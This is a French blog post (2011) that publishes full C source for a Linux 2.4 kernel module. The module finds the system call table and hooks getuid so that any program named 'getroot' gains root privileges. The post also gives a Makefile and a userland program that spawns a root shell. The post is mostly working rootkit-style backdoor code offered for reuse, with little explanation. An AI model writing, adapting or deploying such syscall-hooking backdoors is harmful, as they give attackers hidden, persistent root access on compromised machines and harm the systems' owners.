---
title: "Linux kernel module 2.4 : getroot"
tags: [Coding, kernel]
---

J'ai sur une clé usb plusieurs modules kernels que j'avais bidouillé à une époque (il y a plus d'un an) histoire de m'amuser un peu.  

Les codes en question sont loin d'être des exemples de stabilité et ne compilent pas sous du 2.6... Faute de temps et de volonté, je ne suis pas retourné depuis dans la programmation kernel bien que je ne refuse pas de lire un article sur le sujet quand il me tombe sous le nez.  

En espérant qu'ils puissent encore servir à quelques-uns je les mets en ligne.  

Le module ci-dessous permet (une fois installé) d'obtenir les privilèges root. Il suffit de créer un programme nommé `getroot` qui fera un appel à `getuid()`, du moins la version hookée et modifiée par nos soins :  

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/unistd.h> /* __NR_close */
#include <linux/smp_lock.h> /* unlock_kernel */
#include <linux/syscalls.h> /* sys_close */

/* __NR_getuid faisait appel a sys_getuid16 (adresse dans System.map) : on se sert explicitement de __NR_getuid32 */
void **sys_call_table;

int (*orig_getuid)(void);
int my_getuid(void)
{
  printk(KERN_INFO "Appel a getuid()\n");
  if(strlen(current->comm)==7)
  {
    if(strncmp(current->comm, "getroot", 7) == 0)
    {
      printk(KERN_INFO "Giving root :)\n");
      current->euid=0;
      current->egid=0;
    }
  }
  return current->uid;
}

unsigned long **find_sys_call_table(void)
{
   unsigned long **sctable;
   unsigned long ptr;
   extern int loops_per_jiffy;

   sctable = NULL;
   for (ptr = (unsigned long)&unlock_kernel;
        ptr < (unsigned long)&loops_per_jiffy;
        ptr += sizeof(void *))
   {
      unsigned long *p;
      p = (unsigned long *)ptr;
      if (p[__NR_close] == (unsigned long) sys_close)
      {
         sctable = (unsigned long **)p;
         return &sctable[0];
      }
   }
   return NULL;
}

int init_module(void)
{
  printk(KERN_INFO "hook loaded\n");
  sys_call_table=(void**)find_sys_call_table();
  if(sys_call_table!=NULL)
  {
    printk(KERN_INFO "sys_call_table=%p\n",sys_call_table);
    printk(KERN_INFO "__NR_getuid32=%d\n",__NR_getuid32);
    printk(KERN_INFO "sys_call_table[__NR_getuid32]=%p\n",sys_call_table[__NR_getuid32]);
    orig_getuid=(int(*)(void))(sys_call_table[__NR_getuid32]);
    sys_call_table[__NR_getuid32]=my_getuid;
  }

  return 0;
}

void cleanup_module(void)
{
  if(sys_call_table!=NULL)
  {
    sys_call_table[__NR_getuid32]=orig_getuid;
  }
  printk(KERN_INFO "hook unloaded\n");
}
```

Le Makefile ressemblait à ça :  

```make
obj-m += hook.o

all:
  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Et le programme userland était tout simplement :  

```c
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>

int main(int argc,char *argv)
{
  char * param[] = {"/bin/sh", NULL};
  getuid();
  execve(param[0], param, NULL); //execve est déja un appel système
  return 0;
}
```


*Published January 11 2011 at 17:30*
